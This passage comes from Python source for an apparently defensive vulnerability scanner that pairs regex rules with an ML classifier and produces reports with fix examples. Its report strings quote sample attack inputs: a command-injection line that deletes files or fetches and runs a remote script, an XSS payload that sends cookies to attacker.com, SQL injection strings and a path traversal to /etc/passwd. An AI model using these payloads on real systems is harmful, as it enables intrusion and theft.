            labels: List of labels (1 for vulnerable, 0 for safe)
        """
        logger.info("Training model...")
        self.vectorizer.fit(code_samples)
        X = self.vectorizer.transform(code_samples)
        self.model.fit(X, labels)
        logger.info("Model training completed")
    
    def analyze_code(self, code: str, file_name: str = "analyzed_file.py") -> List[Dict[str, Any]]:
        """
        Analyze code for security vulnerabilities.
        
        Args:
            code: The code to analyze
            file_name: Name of the file being analyzed
            
        Returns:
            List of detected vulnerabilities with details
        """
        # Check if the code is encrypted and decrypt it
        try:
            # Try to check if it's base64 encoded
            base64.b64decode(code)
            # If it looks like base64, attempt decryption
            try:
                code = decrypt(code, key)
                print("\n========== ENCRYPTED CODE DETECTED ==========")
                print("Successfully decrypted code for analysis")
                print("===========================================\n")
            except Exception:
                # If it fails, assume it's already plaintext
                pass
        except Exception:
            # If not valid base64, assume it's already plaintext
            pass
            
        print("\n========== CODE TO ANALYZE ==========")
        print(code)
        print("======================================\n")
        vulnerabilities = []
        lines = code.split('\n')
        line_count = len(lines)
        
        # Debug info
        logger.info(f"Analyzing code with {line_count} lines")
        
        # For very large files, adjust analysis approach
        large_file = line_count > 3000
        if large_file:
            logger.info("Large file detected - using optimized analysis approach")
        
        # Special cases - check for common vulnerability patterns in test code
        test_patterns = {
            'sql_injection': [
                r'SELECT.*FROM.*WHERE.*=.*\+', 
                r'query\s*=.*\+.*password'
            ],
            'command_injection': [
                r'os\.system.*grep.*\+', 
                r'cat.*\|.*grep.*\+'
            ],
            'path_traversal': [
                r'open\(.*?input.*\.txt', 
                r'open\(.*?\+.*?\.txt'
            ],
            'xss': [
                r'<div>Name:.*\+', 
                r'template.*<div>.*\+'
            ]
        }
        
        # First check for test patterns (only on smaller files or sample subset of large files)
        if not large_file or line_count < 5000:  # Full scan for files under 5000 lines
            for vuln_type, patterns in test_patterns.items():
                for pattern in patterns:
                    for i, line in enumerate(lines):
                        if re.search(pattern, line, re.IGNORECASE):
                            context = self._get_context(lines, i)
                            logger.info(f"Test pattern match: {vuln_type} on line {i+1}")
                            
                            vulnerabilities.append({
                                'type': vuln_type,
                                'line_number': i + 1,
                                'line_content': line.strip(),
                                'context': context,
                                'confidence': 'High',
                                'detection_method': 'test_pattern',
                                'fixes': self.FIX_SUGGESTIONS.get(vuln_type, ["No specific fix available"])
                            })
        else:
            # For extremely large files, sample check every 50th line for test patterns
            logger.info("Very large file - sampling lines for test pattern checks")
            sample_indices = range(0, line_count, 50)
            for vuln_type, patterns in test_patterns.items():
                for pattern in patterns:
                    for i in sample_indices:
                        if i < line_count:  # Ensure index is valid
                            line = lines[i]
                            if re.search(pattern, line, re.IGNORECASE):
                                context = self._get_context(lines, i)
                                logger.info(f"Test pattern match (sampled): {vuln_type} on line {i+1}")
                                
                                vulnerabilities.append({
                                    'type': vuln_type,
                                    'line_number': i + 1,
                                    'line_content': line.strip(),
                                    'context': context,
                                    'confidence': 'High',
                                    'detection_method': 'test_pattern_sampled',
                                    'fixes': self.FIX_SUGGESTIONS.get(vuln_type, ["No specific fix available"])
                                })
        
        # Rule-based detection with improved logging
        # For large files, process in chunks to avoid memory issues
        chunk_size = 10000 if large_file else line_count
        
        for chunk_start in range(0, line_count, chunk_size):
            chunk_end = min(chunk_start + chunk_size, line_count)
            chunk = lines[chunk_start:chunk_end]
            
            if large_file:
                logger.info(f"Processing chunk {chunk_start//chunk_size + 1} (lines {chunk_start+1}-{chunk_end})")
            
            # Process this chunk for vulnerability patterns
            for vuln_type, patterns in self.VULNERABILITY_PATTERNS.items():
                for pattern in patterns:
                    for i, line in enumerate(chunk, chunk_start):
                        try:
                            if re.search(pattern, line):
                                # Get surrounding context for the vulnerability
                                context = self._get_context(lines, i)
                                logger.info(f"Pattern match: {vuln_type} on line {i+1}")
                                
                                vulnerabilities.append({
                                    'type': vuln_type,
                                    'line_number': i + 1,
                                    'line_content': line.strip(),
                                    'context': context,
                                    'confidence': 'High',
                                    'detection_method': 'pattern',
                                    'fixes': self.FIX_SUGGESTIONS.get(vuln_type, ["No specific fix available"])
                                })
                        except Exception as e:
                            logger.error(f"Error in pattern matching: {e}")
        
        # Check common function names even without regex patterns
        function_to_vuln = {
            'login': 'sql_injection',
            'get_logs': 'command_injection',
            'render_profile': 'xss',
            'read_file': 'path_traversal',
            'insecure_deserialize': 'insecure_deserialization',
            'hash_password': 'weak_cryptography',
            'store_secret': 'hard_coded_credentials'
        }
        
        # For large files, use a more efficient approach to find function definitions
        if large_file:
            # Use regex to find function definitions more efficiently
            func_pattern = r'def\s+(\w+)'
            for i, line in enumerate(lines):
                match = re.search(func_pattern, line)
                if match:
                    func_name = match.group(1)
                    if func_name in function_to_vuln:
                        vuln_type = function_to_vuln[func_name]
                        # Check if this function is already flagged
                        if not any(v['line_number'] == i+1 for v in vulnerabilities):
                            context = self._get_context(lines, i)
                            logger.info(f"Function name match: {vuln_type} on line {i+1}")
                            
                            vulnerabilities.append({
                                'type': vuln_type,
                                'line_number': i + 1,
                                'line_content': line.strip(),
                                'context': context,
                                'confidence': 'Medium',
                                'detection_method': 'function_name',
                                'fixes': self.FIX_SUGGESTIONS.get(vuln_type, ["No specific fix available"])
                            })
        else:
            # Original approach for smaller files
            for i, line in enumerate(lines):
                for func_name, vuln_type in function_to_vuln.items():
                    if f"def {func_name}" in line:
                        # Check if this function is already flagged
                        if not any(v['line_number'] == i+1 for v in vulnerabilities):
                            context = self._get_context(lines, i)
                            logger.info(f"Function name match: {vuln_type} on line {i+1}")
                            
                            vulnerabilities.append({
                                'type': vuln_type,
                                'line_number': i + 1,
                                'line_content': line.strip(),
                                'context': context,
                                'confidence': 'Medium',
                                'detection_method': 'function_name',
                                'fixes': self.FIX_SUGGESTIONS.get(vuln_type, ["No specific fix available"])
                            })
        
        # ML-based detection - limit to reasonable sized files or samples from large files
        try:
            # Skip ML analysis for extremely large files unless specifically requested
            force_ml = os.environ.get('FORCE_ML_ANALYSIS', '').lower() == 'true'
            if line_count > 20000 and not force_ml:
                logger.info("Skipping ML-based detection for very large file. Use --force-ml option to override.")
            else:
                # Extract code blocks
                code_blocks = self._extract_code_blocks(code)
                if code_blocks:
                    logger.info(f"Extracted {len(code_blocks)} code blocks for ML analysis")
                    
                    # For large files, limit the number of blocks to analyze
                    if large_file and len(code_blocks) > 100:
                        logger.info(f"Limiting ML analysis to 100 blocks out of {len(code_blocks)} for large file")
                        # Sample blocks from throughout the file
                        step = len(code_blocks) // 100
                        sampled_blocks = [code_blocks[i] for i in range(0, len(code_blocks), step)][:100]
                    else:
                        sampled_blocks = code_blocks
                    
                    # Predict vulnerabilities using ML
                    for block in sampled_blocks:
                        # Skip if block already contains known vulnerabilities
                        if not any(vuln.get('context', '') == block for vuln in vulnerabilities):
                            X = self.vectorizer.transform([block])
                            prediction = self.model.predict_proba(X)[0]
                            
                            # Only report if probability is high enough
                            if len(prediction) >= 2 and prediction[1] > 0.65:  # Slightly reduced threshold 
                                # Find the starting line number for this block
                                start_line = self._find_block_start_line(block, lines)
                                
                                # Determine vulnerability type
                                vuln_type = self._determine_vulnerability_type(block)
                                logger.info(f"ML detection: {vuln_type} at line {start_line} with confidence {prediction[1]:.2f}")
                                
                                vulnerabilities.append({
                                    'type': vuln_type,
                                    'line_number': start_line,
                                    'line_content': block.split('\n')[0].strip(),
                                    'context': block,
                                    'confidence': f'{prediction[1]:.2f}',
                                    'detection_method': 'ml',
                                    'fixes': self.FIX_SUGGESTIONS.get(vuln_type, ["Review this code block for potential security issues"])
                                })
        except Exception as e:
            logger.warning(f"ML-based detection failed: {e}")
        
        logger.info(f"Found {len(vulnerabilities)} potential vulnerabilities")
        
        # For large files with many vulnerabilities, limit to most critical ones
        if large_file and len(vulnerabilities) > 100:
            logger.warning(f"Large number of vulnerabilities detected ({len(vulnerabilities)}). Limiting report to top 100.")
            
            # Sort by confidence level (higher = more critical)
            def get_confidence_value(vuln):
                conf = vuln['confidence']
                if conf == 'High':
                    return 0.95
                elif isinstance(conf, str) and conf.replace('.', '', 1).isdigit():
                    return float(conf)
                else:
                    return 0.5
            
            vulnerabilities.sort(key=get_confidence_value, reverse=True)
            vulnerabilities = vulnerabilities[:100]
            
        return vulnerabilities
    
    def _get_context(self, lines: List[str], index: int, context_size: int = 3) -> str:
        """Get surrounding context for a line of code."""
        start = max(0, index - context_size)
        end = min(len(lines), index + context_size + 1)
        return '\n'.join(lines[start:end])
        
    def _find_block_start_line(self, block: str, lines: List[str]) -> int:
        """Find the starting line number of a code block."""
        first_line = block.split('\n')[0].strip()
        for i, line in enumerate(lines):
            if line.strip() == first_line:
                return i + 1
        return 1
    
    def _determine_vulnerability_type(self, code_block: str) -> str:
        """
        Determine the most likely vulnerability type in a code block.
        
        Args:
            code_block: The code block to analyze
            
        Returns:
            The most likely vulnerability type
        """
        # Check for each vulnerability pattern
        for vuln_type, patterns in self.VULNERABILITY_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, code_block):
                    return vuln_type
        
        # If no specific pattern matches, return a generic type
        return "potential_vulnerability"
    
    def _extract_code_blocks(self, code: str) -> List[str]:
        """
        Extract meaningful code blocks for ML analysis.
        
        Args:
            code: The code to analyze
            
        Returns:
            List of code blocks
        """
        blocks = []
        lines = code.split('\n')
        total_lines = len(lines)
        
        # For very large files, use a simpler approach to extract blocks
        large_file = total_lines > 3000
        
        # First try to extract function/method blocks using AST
        # For large files, limit AST parsing to avoid memory issues
        if large_file:
            logger.info("Large file detected - using optimized block extraction")
            
            # Use regex to find function definitions more efficiently
            func_pattern = r'^\s*def\s+\w+\s*\(.*?\):'
            current_func = []
            in_func = False
            indentation = 0
            
            for i, line in enumerate(lines):
                stripped = line.strip()
                
                # Skip empty lines and comments
                if not stripped or stripped.startswith('#'):
                    if in_func:
                        current_func.append(line)
                    continue
                
                # Start of function
                if re.match(func_pattern, line):
                    if in_func and current_func:
                        # End previous function and save it
                        blocks.append('\n'.join(current_func))
                    
                    # Start new function
                    current_func = [line]
                    in_func = True
                    # Calculate indentation of function definition
                    indentation = len(line) - len(line.lstrip())
                elif in_func:
                    # Check if still inside function (based on indentation)
                    if not line.strip():
                        current_func.append(line)
                    elif len(line) - len(line.lstrip()) <= indentation:
                        # End of function due to indentation change
                        blocks.append('\n'.join(current_func))
                        current_func = []
                        in_func = False
                    else:
                        # Still inside function
                        current_func.append(line)
            
            # Add the last function if any
            if in_func and current_func:
                blocks.append('\n'.join(current_func))
                
            # Sample non-function blocks too
            if total_lines > 10000:
                # For very large files, sample blocks at regular intervals
                sample_size = 200
                stride = max(1, total_lines // sample_size)
                
                for i in range(0, total_lines, stride):
                    if i + 10 < total_lines:  # Ensure we have at least 10 lines
                        block_lines = []
                        for j in range(i, min(i + 20, total_lines)):
                            if lines[j].strip():
                                block_lines.append(lines[j])
                        
                        if block_lines:
                            block = '\n'.join(block_lines)
                            # Avoid duplicating function blocks we already extracted
                            if not any(block in existing for existing in blocks):
                                blocks.append(block)
        else:
            # For smaller files, use AST parsing
            try:
                tree = ast.parse(code)
                for node in ast.walk(tree):
                    if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                        func_code = ast.get_source_segment(code, node)
                        if func_code:
                            blocks.append(func_code)
            except SyntaxError:
                # If AST parsing fails, fall back to simple line grouping
                logger.warning("AST parsing failed, falling back to simple line grouping")
                pass
        
        # If no blocks found or parsing failed, use simpler approach
        if not blocks:
            logger.info("No blocks found with primary method, using fallback approach")
            current_block = []
            for line in lines:
                if line.strip():
                    current_block.append(line)
                elif current_block:
                    blocks.append('\n'.join(current_block))
                    current_block = []
            if current_block:
                blocks.append('\n'.join(current_block))
        
        # For very large files, limit the number of blocks to a reasonable size
        if large_file and len(blocks) > 500:
            logger.info(f"Limiting analysis from {len(blocks)} to 500 code blocks due to large file size")
            # Sample blocks evenly from the entire set
            step = len(blocks) // 500
            blocks = [blocks[i] for i in range(0, len(blocks), step)][:500]
        
        logger.info(f"Extracted {len(blocks)} code blocks for analysis")
        return blocks
    
    def suggest_fixes(self, vulnerability: Dict[str, Any]) -> List[str]:
        """
        Suggest fixes for a specific vulnerability.
        
        Args:
            vulnerability: The detected vulnerability
            
        Returns:
            List of fix suggestions
        """
        vuln_type = vulnerability['type']
        if vuln_type in self.FIX_SUGGESTIONS:
            return self.FIX_SUGGESTIONS[vuln_type]
        return ["No specific fix available"]
    
    def generate_report(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """
        Generate a detailed security analysis report.
        
        Args:
            vulnerabilities: List of detected vulnerabilities
            
        Returns:
            Formatted report string
        """
        if not vulnerabilities:
            return "No vulnerabilities detected."
        
        report = "# Security Analysis Report\n\n"
        report += f"Total vulnerabilities detected: {len(vulnerabilities)}\n\n"
        
        # Group by vulnerability type
        vuln_types = {}
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)
        
        # Generate detailed report sections
        for vuln_type, vulns in vuln_types.items():
            report += f"## {vuln_type.replace('_', ' ').title()} ({len(vulns)})\n\n"
            
            for vuln in vulns:
                report += f"### Vulnerability Details\n"
                report += f"- Location: Line {vuln['line_number']}\n"
                report += f"- Vulnerable Code:\n```\n{vuln['line_content']}\n```\n"
                report += f"- Confidence Score: {vuln['confidence']}\n"
                report += f"- Detection Method: {vuln['detection_method']}\n"
                report += f"- Risk Level: {'High' if float(str(vuln['confidence'])) > 0.7 else 'Medium'}\n"
                report += "\n### Recommended Fixes:\n"
                for idx, fix in enumerate(vuln['fixes'], 1):
                    report += f"{idx}. {fix}\n"
                
                if vuln_type in self.FIX_SUGGESTIONS:
                    report += "\n### Code Example:\n"
                    if vuln_type == 'sql_injection':
                        report += "```python\n# Use parameterized queries\ncursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))\n```\n"
                    elif vuln_type == 'command_injection':
                        report += "```python\n# Use subprocess with arguments list\nsubprocess.run(['ls', directory], shell=False)\n```\n"
                    elif vuln_type == 'path_traversal':
                        report += "```python\nimport os\nsafe_path = os.path.normpath(os.path.join(safe_dir, filename))\nif not safe_path.startswith(safe_dir):\n    raise ValueError('Invalid path')\n```\n"
                
                report += "\n---\n\n"
        
        return report

    def generate_detailed_report(self, results: Dict[str, List[Dict[str, Any]]]) -> str:
        """Generate a comprehensive vulnerability report with detailed statistics, descriptions and fixes."""
        report = "=============== SECURITY VULNERABILITY ANALYSIS REPORT ===============\n\n"
        total_vulns = sum(len(vulns) for vulns in results.values())
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # REPORT HEADER
        report += f"SCAN TIMESTAMP: {timestamp}\n"
        report += f"FILES SCANNED: {len(results)}\n"
        report += f"TOTAL VULNERABILITIES DETECTED: {total_vulns}\n\n"
        
        # No vulnerabilities case
        if total_vulns == 0:
            report += " NO SECURITY VULNERABILITIES WERE DETECTED\n"
            return report
            
        # VULNERABILITY SUMMARY SECTION
        report += "============= VULNERABILITY SUMMARY =============\n\n"
        
        # Statistics by vulnerability type
        vuln_types = {}
        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
        
        for file_vulns in results.values():
            for vuln in file_vulns:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                
                # Determine severity based on confidence score
                confidence = vuln['confidence']
                if confidence == 'High':
                    severity_counts["Critical"] += 1
                elif isinstance(confidence, str) and confidence.replace('.', '', 1).isdigit():
                    # Convert numeric string to float
                    confidence_val = float(confidence)
                    if confidence_val > 0.9:
                        severity_counts["Critical"] += 1
                    elif confidence_val > 0.7:
                        severity_counts["High"] += 1
                    elif confidence_val > 0.5:
                        severity_counts["Medium"] += 1
                    else:
                        severity_counts["Low"] += 1
                else:
                    # Default to medium if confidence is an unknown format
                    severity_counts["Medium"] += 1
        
        # Display severity distribution
        report += "SEVERITY DISTRIBUTION:\n"
        for severity, count in severity_counts.items():
            if count > 0:
                report += f"  {severity}: {count}\n"
        report += "\n"
        
        # Display vulnerability type distribution
        report += "VULNERABILITY TYPES FOUND:\n"
        for vuln_type, count in vuln_types.items():
            report += f"  {vuln_type.replace('_', ' ').upper()}: {count}\n"
        
        # DETAILED FINDINGS SECTION
        report += "\n============= DETAILED VULNERABILITY FINDINGS =============\n\n"
        
        # For each file with vulnerabilities
        for file_path, file_vulns in results.items():
            report += f"FILE: {file_path}\n"
            report += "=" * 70 + "\n"
            
            # Group vulnerabilities by type for this file
            file_vuln_types = {}
            for vuln in file_vulns:
                vuln_type = vuln['type']
                if vuln_type not in file_vuln_types:
                    file_vuln_types[vuln_type] = []
                file_vuln_types[vuln_type].append(vuln)
            
            # Report each vulnerability type found in this file
            for vuln_type, vulns in file_vuln_types.items():
                report += f"\n## {vuln_type.replace('_', ' ').upper()} ({len(vulns)} instances)\n\n"
                
                # Add comprehensive description of this vulnerability type
                if vuln_type == 'sql_injection':
                    report += "SQL Injection occurs when user input is incorporated into database queries without proper sanitization.\n"
                    report += "Attackers can manipulate input to modify the intended SQL query, allowing them to:\n"
                    report += "   Extract sensitive data from the database\n"
                    report += "   Bypass authentication\n"
                    report += "   Modify database content (update/delete records)\n"
                    report += "   Execute administrative operations on the database\n"
                    report += "   In some cases, execute commands on the database server\n\n"
                    report += "The vulnerability exists because the application combines SQL commands with user input using\n"
                    report += "string concatenation rather than using parameterized queries or prepared statements.\n"
                
                elif vuln_type == 'command_injection':
                    report += "Command Injection occurs when an application passes unsafe user data to a system shell.\n"
                    report += "Attackers can include shell metacharacters to execute arbitrary commands, allowing them to:\n"
                    report += "   Execute system commands with the privileges of the application\n"
                    report += "   Access, modify, or delete data on the system\n"
                    report += "   Install malware or create backdoor accounts\n"
                    report += "   Pivot to attack other systems on the internal network\n\n"
                    report += "The vulnerability exists because user input is directly incorporated into command strings\n"
                    report += "passed to a shell, rather than using safer alternatives like subprocess with shell=False.\n"
                
                elif vuln_type == 'path_traversal':
                    report += "Path Traversal (Directory Traversal) allows attackers to access files and directories\n"
                    report += "outside of intended boundaries by manipulating variables that reference files with\n"
                    report += "path traversal sequences (../) and their variations. This allows attackers to:\n"
                    report += "   Access sensitive files and data outside the web root directory\n"
                    report += "   Read application source code or configuration files\n"
                    report += "   Access system files containing sensitive information\n\n"
                    report += "The vulnerability exists because user input is directly incorporated into file paths\n"
                    report += "without proper validation and normalization to ensure the path remains within safe boundaries.\n"
                
                elif vuln_type == 'xss':
                    report += "Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page\n"
                    report += "without proper validation or escaping. This allows attackers to execute scripts in a victim's\n"
                    report += "browser, which can lead to:\n"
                    report += "   Hijacking user sessions and stealing session cookies\n"
                    report += "   Capturing keystrokes and form data\n"
                    report += "   Redirecting users to malicious sites\n"
                    report += "   Defacing websites or injecting trojan functionality\n\n"
                    report += "The vulnerability exists because user input is directly incorporated into HTML output\n"
                    report += "without properly escaping special characters that could be interpreted as HTML or JavaScript.\n"
                
                elif vuln_type == 'insecure_deserialization':
                    report += "Insecure Deserialization occurs when untrusted data is used to abuse the logic of an application,\n"
                    report += "inflict a denial of service (DoS) attack, or execute arbitrary code. When the application\n"
                    report += "deserializes untrusted data, an attacker can:\n"
                    report += "   Execute arbitrary code on the server\n"
                    report += "   Manipulate application logic\n"
                    report += "   Perform denial of service attacks\n"
                    report += "   Escalate privileges\n\n"
                    report += "The vulnerability exists because the application deserializes data without verifying its source\n"
                    report += "and integrity, particularly when using powerful deserialization libraries like pickle in Python.\n"
                
                elif vuln_type == 'weak_cryptography':
                    report += "Weak Cryptography vulnerabilities occur when outdated or cryptographically weak algorithms\n"
                    report += "are used to protect sensitive information. This allows attackers to:\n"
                    report += "   Decrypt sensitive information with relatively minimal effort\n"
                    report += "   Break encryption using known attack methods\n"
                    report += "   Predict cryptographic values that should be unpredictable\n\n"
                    report += "The vulnerability exists because the application uses cryptographic algorithms (like MD5 or SHA1)\n"
                    report += "that are no longer considered secure against modern attack techniques, or uses secure algorithms\n"
                    report += "with insufficient key sizes or improper implementation.\n"
                
                elif vuln_type == 'hard_coded_credentials':
                    report += "Hard-coded Credentials are literal authentication details (usernames, passwords, API keys, etc.)\n"
                    report += "embedded directly in application source code. This practice introduces serious security risks:\n"
                    report += "   Allows anyone with access to the source code to obtain credentials\n"
                    report += "   Makes credential rotation difficult or impossible without code changes\n"
                    report += "   Increases risk in case of a code leak or repository compromise\n"
                    report += "   Often leads to shared credentials across multiple environments\n\n"
                    report += "The vulnerability exists because authentication credentials are directly coded into the application\n"
                    report += "rather than being stored in a secure configuration system or environment variables.\n"
                
                else:
                    report += "This vulnerability type may expose your application to security risks by allowing\n"
                    report += "attackers to perform unintended operations or access unauthorized data.\n"
                
                report += "\n"
                
                # Detail each instance of this vulnerability type
                for i, vuln in enumerate(vulns, 1):
                    # Determine severity for this specific vulnerability
                    confidence = vuln['confidence']
                    if confidence == 'High':
                        severity = "CRITICAL"
                    elif isinstance(confidence, str) and confidence.replace('.', '', 1).isdigit():
                        # Convert numeric string to float
                        confidence_val = float(confidence)
                        if confidence_val > 0.9:
                            severity = "CRITICAL"
                        elif confidence_val > 0.7:
                            severity = "HIGH"
                        elif confidence_val > 0.5:
                            severity = "MEDIUM"
                        else:
                            severity = "LOW"
                    else:
                        # Default to medium if confidence is an unknown format
                        severity = "MEDIUM"
                    
                    report += f"INSTANCE {i}:\n"
                    report += f"  Line Number: {vuln['line_number']}\n"
                    report += f"  Risk Level: {severity}\n"
                    report += f"  Confidence: {vuln['confidence']}\n"
                    report += f"  Detection Method: {vuln['detection_method']}\n"
                    report += f"  Vulnerable Code:\n    ```\n    {vuln['line_content']}\n    ```\n\n"
                    
                    # Add context if available
                    if 'context' in vuln and vuln['context'] != vuln['line_content']:
                        report += f"  Code Context:\n    ```\n    {vuln['context']}\n    ```\n\n"
                    
                    # Specific explanation for this instance
                    report += "  WHY THIS IS VULNERABLE:\n"
                    if vuln_type == 'sql_injection':
                        report += "    This code directly concatenates user input into an SQL query string without sanitization.\n"
                        report += "    An attacker could input something like: ' OR '1'='1 to bypass authentication or\n"
                        report += "    '; DROP TABLE users; -- to delete entire tables. The statement would execute with the\n"
                        report += "    same database privileges as the application.\n"
                    
                    elif vuln_type == 'command_injection':
                        report += "    This code passes user input directly to a system command without sanitization.\n"
                        report += "    An attacker could input a string like: data; rm -rf / or date && wget malicious.sh -O /tmp/x.sh && bash /tmp/x.sh\n"
                        report += "    to execute arbitrary commands on the system with the same privileges as the application.\n"
                    
                    elif vuln_type == 'path_traversal':
                        report += "    This code uses user input in a file path without proper validation or sanitization.\n"
                        report += "    An attacker could provide input like '../../../etc/passwd' to access sensitive system files\n"
                        report += "    outside of the intended directory structure.\n"
                    
                    elif vuln_type == 'xss':
                        report += "    This code inserts user input directly into HTML output without escaping special characters.\n"
                        report += "    An attacker could input HTML and JavaScript like: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>\n"
                        report += "    which would execute in victims' browsers when they view the page.\n"
                    
                    elif vuln_type == 'insecure_deserialization':
                        report += "    This code deserializes untrusted data using a powerful deserialization method (like pickle).\n"
                        report += "    An attacker could craft a serialized payload that, when deserialized, executes arbitrary code.\n"
                        report += "    For example, a crafted pickle object can execute any Python code when deserialized.\n"
                    
                    elif vuln_type == 'weak_cryptography':
                        report += "    This code uses a cryptographically weak or outdated hashing algorithm (like MD5 or SHA1).\n"
                        report += "    These algorithms are vulnerable to collision attacks and can be brute-forced with modern\n"
                        report += "    computing resources. A secure password hash should use algorithms like bcrypt, argon2, or PBKDF2.\n"
                    
                    elif vuln_type == 'hard_coded_credentials':
                        report += "    This code contains hard-coded credentials (password, API key, or secret) directly in the source code.\n"
                        report += "    Anyone with access to the code can discover these credentials, and they cannot be easily rotated\n"
                        report += "    or managed across different environments without changing the code itself.\n"
                    
                    # Recommended fixes with detailed explanations
                    report += "\n  HOW TO FIX:\n"
                    for j, fix in enumerate(vuln['fixes'], 1):
                        report += f"    {j}. {fix}\n"
                    
                    # Code examples with detailed corrections for common vulnerabilities
                    if vuln_type == 'sql_injection':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n"
                        report += "    cursor.execute(query)\n\n"
                        report += "    # SECURE - Using parameterized queries:\n"
                        report += "    query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n"
                        report += "    cursor.execute(query, (username, password))\n"
                        report += "    ```\n"
                        report += "    Parameterized queries ensure that user input is treated as data, not executable code.\n"
                        report += "    Even if the input contains SQL metacharacters, they are escaped properly.\n"
                    
                    elif vuln_type == 'command_injection':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    os.system(\"cat /var/log/app.log | grep \" + date)\n\n"
                        report += "    # SECURE - Using subprocess with arguments as a list:\n"
                        report += "    import subprocess\n"
                        report += "    output = subprocess.run([\"grep\", date, \"/var/log/app.log\"], capture_output=True, text=True, shell=False)\n"
                        report += "    ```\n"
                        report += "    Using subprocess with shell=False and passing arguments as a list prevents shell interpretation\n"
                        report += "    of metacharacters in the user input, treating them as literal characters instead.\n"
                    
                    elif vuln_type == 'path_traversal':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    with open(user_input + \".txt\", \"r\") as f:\n\n"
                        report += "    # SECURE - Validate and sanitize paths:\n"
                        report += "    import os\n"
                        report += "    # Define a safe base directory\n"
                        report += "    safe_dir = \"/path/to/allowed/files\"\n"
                        report += "    # Normalize and verify path is within safe directory\n"
                        report += f"    requested_path = os.path.normpath(os.path.join(safe_dir, user_input + \".txt\"))\n"
                        report += "    if not requested_path.startswith(safe_dir):\n"
                        report += "        raise ValueError(\"Access denied: attempted directory traversal\")\n"
                        report += "    # Now safe to open\n"
                        report += "    with open(requested_path, \"r\") as f:\n"
                        report += "    ```\n"
                        report += "    This approach normalizes the path (resolving any ../ sequences) and then verifies\n"
                        report += "    the resulting path is still within the allowed directory before accessing the file.\n"
                    
                    elif vuln_type == 'xss':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    template = \"<div>Name: \" + user_data['name'] + \"</div>\"\n\n"
                        report += "    # SECURE - Escape HTML special characters:\n"
                        report += "    import html\n"
                        report += "    template = f\"<div>Name: {html.escape(user_data['name'])}</div>\"\n"
                        report += "    ```\n"
                        report += "    The html.escape() function converts special characters like < and > to their HTML\n"
                        report += "    entity equivalents (&lt; and &gt;), preventing browsers from interpreting them as HTML tags.\n"
                    
                    elif vuln_type == 'insecure_deserialization':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    import pickle\n"
                        report += "    return pickle.loads(data)\n\n"
                        report += "    # SECURE - Use a safe serialization format:\n"
                        report += "    import json\n"
                        report += "    import hmac\n"
                        report += "    import hashlib\n\n"
                        report += "    # When serializing: add a signature\n"
                        report += "    def safe_serialize(obj, secret_key):\n"
                        report += "        json_data = json.dumps(obj)\n"
                        report += "        signature = hmac.new(secret_key.encode(), json_data.encode(), hashlib.sha256).hexdigest()\n"
                        report += "        return json_data + '.' + signature\n\n"
                        report += "    # When deserializing: verify the signature\n"
                        report += "    def safe_deserialize(signed_data, secret_key):\n"
                        report += "        try:\n"
                        report += "            data, signature = signed_data.rsplit('.', 1)\n"
                        report += "            expected_sig = hmac.new(secret_key.encode(), data.encode(), hashlib.sha256).hexdigest()\n"
                        report += "            if not hmac.compare_digest(signature, expected_sig):\n"
                        report += "                raise ValueError(\"Invalid signature\")\n"
                        report += "            return json.loads(data)\n"
                        report += "        except Exception as e:\n"
                        report += "            raise ValueError(f\"Invalid data format: {e}\")\n"
                        report += "    ```\n"
                        report += "    This approach uses JSON (which cannot execute code) instead of pickle, and adds a\n"
                        report += "    cryptographic signature to verify the data hasn't been tampered with.\n"
                    
                    elif vuln_type == 'weak_cryptography':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    import hashlib\n"
                        report += "    return hashlib.md5(password.encode()).hexdigest()\n\n"
                        report += "    # SECURE - Use a proper password hashing algorithm:\n"
                        report += "    import hashlib\n"
                        report += "    import os\n\n"
                        report += "    # When creating/updating a password\n"
                        report += "    def hash_password(password):\n"
                        report += "        salt = os.urandom(32)  # 32 bytes = 256 bits\n"
                        report += "        key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)\n"
                        report += "        # Combine salt and key in a single string\n"
                        report += "        return salt.hex() + ':' + key.hex()\n\n"
                        report += "    # When verifying a password\n"
                        report += "    def verify_password(stored_password, provided_password):\n"
                        report += "        salt_hex, key_hex = stored_password.split(':')\n"
                        report += "        salt = bytes.fromhex(salt_hex)\n"
                        report += "        key = hashlib.pbkdf2_hmac('sha256', provided_password.encode(), salt, 100000)\n"
                        report += "        return key.hex() == key_hex\n"
                        report += "    ```\n"
                        report += "    This uses PBKDF2 with SHA-256, a salt, and 100,000 iterations - much more secure than MD5.\n"
                        report += "    For even better security, consider using specialized libraries like 'passlib' with bcrypt or Argon2.\n"
                    
                    elif vuln_type == 'hard_coded_credentials':
                        report += "\n  SECURE CODE EXAMPLE:\n"
                        report += "    ```python\n"
                        report += "    # VULNERABLE:\n"
                        report += "    api_key = \"12345secret_key_here\"\n"
                        report += "    password = \"admin123\"\n\n"
                        report += "    # SECURE - Use environment variables:\n"
                        report += "    import os\n"
                        report += "    api_key = os.environ.get(\"API_KEY\")\n"
